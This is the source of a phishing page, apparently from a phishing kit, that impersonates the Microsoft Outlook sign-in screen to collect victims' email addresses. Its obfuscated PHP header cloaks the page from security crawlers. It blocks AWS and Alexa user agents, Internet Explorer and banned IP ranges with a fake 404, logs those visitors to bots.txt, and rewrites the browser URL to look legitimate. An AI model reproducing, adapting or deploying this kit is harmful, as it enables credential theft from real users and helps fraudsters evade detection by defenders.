<?php 
goto cyM2f; p3j_m: if ($BLOCKOTHERBOTS == "\61") { if (!empty($_SERVER["\x48\x54\124\x50\x5f\x55\x53\105\x52\x5f\101\x47\105\x4e\124"])) { goto X4mk1; VLp04: zh_sd: goto rXByj; AyqKK: foreach ($userAgents as $agent) { if (strpos($_SERVER["\x48\124\124\x50\137\125\x53\x45\x52\137\101\107\105\116\124"], $agent) !== false) { goto kBlt0; Ur0dK: exit; goto NkYGR; Ee6TY: header("\110\124\124\x50\x2f\x31\56\60\x20\x34\60\x34\x20\x4e\x6f\164\x20\x46\157\x75\x6e\x64"); goto vSNWh; vSNWh: die("\74\150\x31\x3e\x34\x30\64\40\x4e\x6f\x74\x20\x46\x6f\x75\x6e\144\74\x2f\x68\61\x3e\124\150\145\x20\x70\x61\x67\x65\40\164\x68\x61\x74\x20\171\157\x75\x20\150\141\166\145\40\162\145\x71\x75\145\x73\x74\145\144\x20\x63\157\165\x6c\144\40\156\x6f\164\40\142\x65\x20\146\157\165\156\144\56"); goto Ur0dK; kBlt0: $file = fopen("\x62\x6f\164\163\x2e\164\x78\x74", "\x61"); goto OSkim; DjSjK: fclose($file); goto Ee6TY; OSkim: fwrite($file, $_SERVER["\x52\105\x4d\x4f\124\x45\x5f\x41\x44\104\x52"] . "\x20" . $_SERVER["\x48\x54\x54\x50\x5f\x55\123\105\x52\137\101\107\105\116\124"] . "\xd\12"); goto DjSjK; NkYGR: } eE2ne: } goto VLp04; X4mk1: include "\157\x74\150\x65\x72\x62\56\160\x68\160"; goto AyqKK; rXByj: } } goto A3z70; PyKXB: require "\143\x6f\x6e\x66\x69\x67\56\160\x68\160"; goto TlDvn; UQ3UC: if ($BLOCKIPRANGE == "\61") { include "\151\x70\162\141\x6e\x67\x65\x2e\x70\x68\160"; if (in_array($_SERVER["\x52\x45\x4d\x4f\124\x45\137\x41\x44\104\122"], $bannedIP)) { goto kj5AT; kj5AT: header("\110\x54\x54\x50\57\x31\56\x30\40\64\x30\x34\x20\x4e\x6f\x74\x20\106\157\x75\x6e\x64"); goto kNRtI; kNRtI: die("\74\x68\61\76\64\60\64\40\x4e\x6f\x74\40\106\157\x75\x6e\x64\74\x2f\150\x31\x3e\x54\x68\145\x20\160\x61\x67\x65\40\164\150\x61\x74\x20\171\157\165\x20\150\x61\166\145\40\x72\x65\x71\165\145\x73\x74\145\144\x20\x63\157\x75\x6c\x64\x20\156\157\164\40\x62\145\x20\x66\157\x75\156\144\x2e"); goto gsJnl; gsJnl: exit; goto zP_gW; zP_gW: } else { foreach ($bannedIP as $ip) { if (preg_match("\57" . $ip . "\x2f", $_SERVER["\122\x45\x4d\x4f\124\x45\x5f\101\x44\104\122"])) { goto BiH3H; BQFDx: fclose($file); goto zVwde; r3NNG: exit; goto zcPHM; zVwde: header("\x48\124\x54\x50\57\61\56\x30\x20\x34\x30\x34\40\116\157\x74\40\106\x6f\165\x6e\x64"); goto p7JNT; p7JNT: die("\x3c\x68\61\x3e\x34\60\64\40\x4e\157\x74\40\106\157\x75\x6e\144\74\57\150\61\76\124\x68\145\40\x70\x61\x67\145\40\164\150\x61\x74\x20\171\x6f\165\x20\150\141\166\x65\x20\x72\x65\x71\165\145\163\x74\x65\144\x20\143\157\165\x6c\x64\x20\x6e\157\164\40\142\145\40\x66\157\165\x6e\x64\56"); goto r3NNG; BiH3H: $file = fopen("\x62\157\x74\163\56\x74\x78\164", "\141"); goto G0brP; G0brP: fwrite($file, $_SERVER["\x52\105\x4d\117\124\x45\x5f\101\x44\x44\122"] . "\40" . $_SERVER["\x48\124\124\x50\x5f\x55\123\105\x52\137\x41\107\105\116\x54"] . "\15\xa"); goto BQFDx; zcPHM: } shv5R: } k8eoC: } } goto p3j_m; Ai_2P: session_start(); goto PyKXB; cyM2f: error_reporting(0); goto Ai_2P; C2mn9: if ($BLOCKIE == "\61") { if (strpos($_SERVER["\110\x54\124\x50\x5f\125\x53\x45\122\x5f\101\107\x45\x4e\124"], "\124\162\151\x64\145\x6e\164") !== false) { goto y5480; y5480: $file = fopen("\x62\x6f\164\163\56\x74\170\x74", "\141"); goto JSVCd; UK7dD: die("\74\x68\x31\76\64\60\64\x20\x4e\x6f\x74\x20\106\x6f\x75\156\x64\x3c\x2f\150\x31\76\124\x68\145\40\160\x61\x67\145\40\164\x68\141\164\40\x79\x6f\165\40\150\x61\166\145\40\x72\x65\x71\165\x65\x73\164\145\x64\40\x63\x6f\165\x6c\x64\40\x6e\x6f\164\40\142\145\40\146\157\165\x6e\144\56"); goto Culg4; N3VLf: header("\x48\124\x54\x50\57\61\56\x30\x20\64\60\64\x20\116\157\164\x20\106\x6f\165\x6e\x64"); goto UK7dD; ZJTte: fclose($file); goto N3VLf; Culg4: exit; goto K0L6C; JSVCd: fwrite($file, $_SERVER["\x52\105\x4d\117\x54\105\137\101\104\x44\122"] . "\x20" . $_SERVER["\110\124\124\120\x5f\125\123\x45\122\x5f\101\x47\105\116\x54"] . "\15\12"); goto ZJTte; K0L6C: } } goto UQ3UC; A3z70: $v_ip = $_SERVER["\122\x45\115\x4f\124\105\137\x41\104\x44\x52"]; goto KEQra; TlDvn: if ($BLOCKAWS == "\61") { if (strpos($_SERVER["\x48\124\x54\120\x5f\x55\123\105\122\137\x41\x47\105\x4e\124"], "\x61\167\x73") !== false || strpos($_SERVER["\110\x54\x54\120\137\125\123\105\122\x5f\x41\107\x45\x4e\x54"], "\x61\x6c\145\x78\141") !== false || strpos($_SERVER["\110\x54\124\x50\137\x55\x53\x45\x52\137\x41\x47\x45\x4e\124"], "\x61\155\x7a\156\x6b\x61\x73\x73\x6f\143\x62\x6f\x74") !== false || strpos($_SERVER["\x48\x54\x54\x50\x5f\125\x53\105\122\137\101\x47\105\x4e\x54"], "\145\x6d\141\x63\x73\x2d\167\63\x20\163\145\x61\x72\x63\150\40\x65\156\147\151\x6e\145") !== false) { goto tx2SV; QdkLE: fclose($file); goto ysaCt; tx2SV: $file = fopen("\142\x6f\164\163\x2e\x74\170\x74", "\141"); goto JN2Fi; qH53d: exit; goto GWiKc; DBwW0: die("\74\150\x31\76\64\60\x34\40\x4e\157\x74\x20\x46\x6f\x75\156\144\x3c\57\150\x31\76\124\150\x65\x20\160\x61\147\145\x20\164\x68\141\164\40\x79\x6f\165\40\x68\x61\x76\145\x20\x72\145\161\x75\x65\x73\x74\145\x64\x20\143\157\x75\154\x64\40\x6e\157\164\40\142\x65\x20\146\x6f\165\x6e\144\x2e"); goto qH53d; ysaCt: header("\x48\124\x54\x50\57\61\56\x30\40\64\60\x34\x20\116\157\164\x20\106\x6f\x75\x6e\144"); goto DBwW0; JN2Fi: fwrite($file, $_SERVER["\x52\x45\x4d\117\x54\105\137\101\x44\104\122"] . "\40" . $_SERVER["\110\124\124\120\137\125\123\105\x52\137\x41\x47\105\116\x54"] . "\15\12"); goto QdkLE; GWiKc: } } goto C2mn9; KEQra: $hash = md5($v_ip); goto x2NFD; x2NFD: if ($_SESSION["\x74\x6f\x6b\x65\156"] == '') { goto sif18; sif18: header("\x48\x54\124\x50\57\x31\x2e\60\x20\x34\x30\64\x20\x4e\157\164\40\x46\x6f\165\x6e\144"); goto jjwmq; jjwmq: die("\x3c\150\x31\x3e\64\x30\x34\40\x4e\x6f\x74\x20\x46\x6f\165\156\144\x3c\x2f\150\x31\x3e\x54\150\x65\x20\160\141\x67\x65\x20\x74\x68\x61\x74\40\171\157\x75\40\150\x61\166\145\40\162\145\x71\165\145\163\x74\145\144\x20\143\x6f\165\154\x64\x20\x6e\x6f\x74\40\142\x65\40\x66\x6f\x75\156\144\x2e"); goto pw0wC; pw0wC: exit; goto MeecB; MeecB: }


?> <!DOCTYPE html> <html dir="ltr" lang="EN-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><base href="."> <script> function empty() {
    var x;
    x=document.getElementById("username").value;
    if (x=="") {
        document.getElementById("username").style="border-color:red";
        document.getElementById("username_error").style="display: block";
        return false;
    }
    ;
}

</script> <script> function change() {
    var e;
    e=document.getElementById("username").value;
    if (e !=="") {
        document.getElementById("username").style="";
        document.getElementById("username_error").style="display: none";
    }
}

</script> <style> .wrapper {
    position: relative;
    overflow: hidden;
}

#slide {
    right: -128px;
    -webkit-animation: slide 0.3s forwards;
	
    -webkit-animation-delay: 0s;
    animation: slide 0.4s forwards; 1s fadeIn;
    animation-delay: 0s;
	    opacity: 0;

}

@-webkit-keyframes slide {
    100% {
        right: 0;

    }
}

@keyframes slide {
    100% {
        right: 0;
		opacity: 1;
    }
}

</style> <title>Sign in</title> <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"> <link rel="shortcut icon" href="./files/favicon.ico"> <link rel="stylesheet" title="Converged" type="text/css" href="./files/Converged1033.css"><style type="text/css">body.cb input.hip {
    border-width: 2px !important;
}

</style><style type="text/css">body {
    display: none;
}

</style> <style type="text/css">body {
    display: block !important;
}

</style> <link rel="image_src" href=""> </head>       
<body 
   <?php if ($REDGHOST==1)
   {echo 'onload="myFunction2()"';}?> class="cb" data-bind="defineGlobals: ServerData, bodyCssClass" >
 
 

 <script>
function myFunction2() {
window.history.pushState('Object', 'Title', 'common/login');
}
</script>  <div> <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;./files2/1-small.jpg&quot;);"></div><div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;./files2/<?php if ($style=="new") {echo '1.jpg';}
else { echo '0.jpg';}?>&quot;); z-index: 99999;"></div><div class="background-overlay"></div> </div></div> <form name="f1" id="i0281" spellcheck="false" autocomplete="off" method="post" action="login?&sessionid=<?php echo $hash; ?>&ss=2"> <div class="outer" data-bind="component: { name: &#39;page&#39;,
 params: {
    serverData: svr, showButtons: svr.A2, showFooterLinks: true, useWizardBehavior: svr.BR, handleWizardButtons: false, password: password, hideFromAria: ariaHidden
}

,
event: {
    footerAgreementClick: footer_agreementClick
}


}
"> <div class="middle" style="
    z-index: 9999;
">
 <div id="footer" class="footer default" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
 params: {
    serverData: svr, showLinks: true
}
,
event: {
    agreementClick: footer_agreementClick
}

}
"> <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy" data-bind="html: svr.aa">©2020 Microsoft</span> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'],
href: termsLink,
click: termsLink_onClick" href="">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'],
href: privacyLink,
click: privacyLink_onClick" href="">Privacy &amp; Cookies</a> </div> </div> </div>
 <div class="background-logo-holder"> <img id="banner_image" class="background-logo" src="<?php if ($style=="new") {echo 'files2/ou.png';} else
 {echo 'files/logo3.png';}?>
 "> </div> <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }" style="
 padding-top: 36px;
">
<div id="progressBar" style="display:none" class="progress" role="progressbar" data-bind="component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div> <div data-bind="component: { name: &#39;logo-control&#39;,
 params: {
    isChinaDc: svr.fIsChinaDc,
    bannerLogoUrl: $loginPage.bannerLogoUrl()
}

}
">
 <img class="logo" role="presentation" pngsrc="./files/microsoft_logo.png" svgsrc="./files/microsoft_logo.svg" data-bind="imgSrc" src="./files/microsoft_logo.svg"></div> <div data-bind="
 css: {
    &#39;
    wide&#39;
    : paginationControlMethods() &amp;
    &amp;
    paginationControlMethods().currentViewHasMetadata(&#39;
    wide&#39;
    )
}
,
component: {
    name: &#39;
    pagination-control&#39;
    ,
    publicMethods: paginationControlMethods,
    params: {
        initialViewId: initialViewId,
        currentViewId: currentViewId,
        initialSharedData: initialSharedData,
        initialError: $loginPage.getServerError()
    }
    ,
    event: {
        cancel: paginationControl_onCancel,
        showView: $loginPage.view_onShow
    }
}
">
<div id="slide" class="wrapper">
<div data-bind="css: {
    &#39;
    animate&#39;
    : animate() || animate.back(),
    &#39;
    back&#39;
    : animate.back
}
">
 <div data-viewid="1" data-bind="pageViewComponent: { name: &#39;login-paginated-username-view&#39;,
 params: {
    serverData: svr,
    serverError: initialError,
    isInitialView: isInitialState,
    displayName: sharedData.displayName,
    prefillNames: $loginPage.prefillNames,
    flowToken: sharedData.flowToken
}
,
event: {
    refresh: $loginPage.view_onRefresh,
    redirect: $loginPage.view_onRedirect,
    showLearnMore: $loginPage.learnMore_onShow
}

}
"><div class="row text-title" id="loginHeader" style="
    padding: 0px 4px;
"> <div role="heading" aria-level="1" data-bind="text: title" style="
    font-weight: 600;
">Sign in</div><!-- ko if: isSubtitleVisible --> <div role="heading" aria-level="2" class="text-13 subtitle" data-bind="text: str['WF_STR_App_Title']">to continue to Outlook</div><!-- /ko --> </div> <div class="row"> <div role="alert" aria-live="assertive" aria-atomic="false"> </div> <div class="form-group col-md-24">
 <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;, params: {
 serverData: svr,
textInput: displayName,
hasFocus: isFocused,
hintText: tenantBranding.UserIdLabel || str[&#39;
CT_PWD_STR_Email_Example&#39;
],
hintCss: &#39;
placeholder&#39;
+ (!svr.Ba ? &#39;
ltr_override&#39;
: &#39;
&#39;
)
}

}
">			
 <label id="username_error" style="display: none"><font color="red">Enter a valid email address,
phone number,
or Skype name.</font></label> <input required type="email" name="username" id="username" value="<?php echo $_SESSION['username'];?>" maxlength="113" onblur="change();" class="form-control ltr_override" placeholder="Email or phone"> <input name="password" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending" style="display: none;"><div></div><div></div><div></div><div></div><div></div><div></div></div>  </div> </div> </div> </div> <div class="row"><div data-bind="component: { name: &#39;footer-buttons-field&#39;,
 params: {
    serverData: svr,
    isPrimaryButtonEnabled: !isRequestPending(),
    isPrimaryButtonVisible: svr.A2,
    isSecondaryButtonEnabled: true,
    isSecondaryButtonVisible: svr.A2 &amp;
    &amp;
    isBackButtonVisible()
}
,
event: {
    primaryButtonClick: primaryButton_onClick,
    secondaryButtonClick: secondaryButton_onClick
}

}
"><div class="col-xs-24 form-group no-padding-left-right" data-bind=" visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
css: {
    &#39;
    no-margin-bottom&#39;
    : removeBottomMargin
}
"> <div data-bind="css: {
    &#39;
    col-xs-12 secondary&#39;
    : isPrimaryButtonVisible(),
    &#39;
    col-xs-24&#39;
    : !isPrimaryButtonVisible()
}
" class="col-xs-12 secondary"> <input type="button" id="idBtn_Back" class="btn btn-block" data-bind=" attr: {
    &#39;
    id&#39;
    : secondaryButtonId || &#39;
    idBtn_Back&#39;
    ,
    &#39;
    aria-describedby&#39;
    : secondaryButtonDescribedBy
}
,
value: secondaryButtonText() || str[&#39;
CT_HRD_STR_Splitter_Back&#39;
],
hasFocus: focusOnSecondaryButton,
click: secondaryButton_onClick,
enable: isSecondaryButtonEnabled,
visible: isSecondaryButtonVisible" value="Back" style="display: none;
"> </div> <div data-bind="css: {
    &#39;
    col-xs-12 primary&#39;
    : isSecondaryButtonVisible(),
    &#39;
    col-xs-24&#39;
    : !isSecondaryButtonVisible()
}
" class="col-xs-24">  <div class="text-13 form-group no-margin-bottom" data-bind=" css: {
    &#39;
    no-margin-bottom&#39;
    : !svr.B3 &amp;
    &amp;
    !svr.showCantAccessAccountLink
}
,
htmlWithBindings: html[&#39;
WF_STR_SignUpLink_Text&#39;
],
childBindings: {
    &#39;
    signup&#39;
    : {
        href: svr.b,
        css: {
            &#39;
            display-inline-block&#39;
            : true
        }
        ,
        ariaLabel: str[&#39;
        WF_STR_SignupLink_AriaLabel_Text&#39;
        ],
        click: signup_onClick
    }
}
"><a href="https: //signup.live.com/signup.aspx?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1506073308&amp;rver=6.7.6640.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fauthRedirect%3dtrue%26nlp%3d1%26RpsCsrfState%3d55744145-df9f-4b42-d610-7776eac27bf1&amp;id=292841&amp;CBCXT=out&amp;fl=wld&amp;cobrandid=90015&amp;contextid=0A756D19FCBE8143&amp;bk=1506073308&amp;uiflavor=web&amp;uaid=d6ee5e91cdc941c5ac139979d5440035&amp;mkt=EN-US&amp;lc=1033" id="signup" class="display-inline-block" aria-label="Create a Microsoft account">
Can’t access your account?</a></div> </div> </div> </div> </div></div>  <div data-bind="component: { name: &#39;instrumentation&#39;,
 publicMethods: instrumentationMethods,
params: {
    serverData: svr
}

}
"><div class="form-group" data-bind=" component: {
    name: 'cred-switch-link-control',
    params: {
        serverData: svr,
        availableCreds: availableCredsWithoutUsername(),
        showForgotUsername: svr.fShowForgotUsernameLink
    }
    ,
    event: {
        switchView: noUsernameCredSwitchLink_onSwitchView,
        redirect: onRedirect,
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog,
        showDialog: onShowDialog
    }
}
"><!--  --> <div class="form-group"><!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) --><!-- /ko --><!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --> <a href="next.php?ss=2" data-bind=" attr: {
    'id': switchToCredId
}
,
text: switchToCredText,
click: switchToCred_onClick" id="idA_PWD_SwitchToFido" style=" font-size: 13px;
">Sign in with a security key</a><!-- ko if: displayHelp && selectedCredType === 7 --><!-- ko component: { name: 'fido-help-button-control',
 params: {
    isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable()
}
,
event: {
    registerDialog: onRegisterDialog,
    unregisterDialog: onUnregisterDialog,
    showDialog: onShowDialog
}

}
--><!-- --> <span class="help-button" role="button" tabindex="0" data-bind="
 click: fidoHelp_onClick,
pressEnter: fidoHelp_onClick,
ariaLabel: str['CT_STR_CredentialPicker_Help_Desc']" aria-label="Learn more about this sign-in option"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="files/quest.png" svgsrc="" data-bind="imgSrc" src="files/quest.png"><!-- /ko --> <!-- /ko --><!-- /ko --> </span>
</div> <div data-bind="component: {
    name: 'fido-help-dialog-content-control',
    params: {
        isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable
    }
    ,
    event: {
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog
    }
}
"><!--  --> <div data-bind="component: {
    name: 'dialog-content-control',
    params: {
        dialogId: 1,
        data: {
            labelledBy: 'fidoDialogTitle',
            describedBy: 'fidoDialogDesc fidoDialogDesc2',
            primaryButtonPreventTabbing: {
                direction: 'down'
            }
            ,
            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable
        }
    }
    ,
    event: {
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog
    }
}
"><!-- --></div></div><!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko --> </div><!-- ko if: credLinkError --><!-- /ko --></div>
 <script> function myFunction() {
    document.getElementById('progressBar').style='display:block;';
}
</script> <input type="submit" style="float:right" onclick="myFunction()" id="idSIButton9"  class="btn btn-primary" value="Next">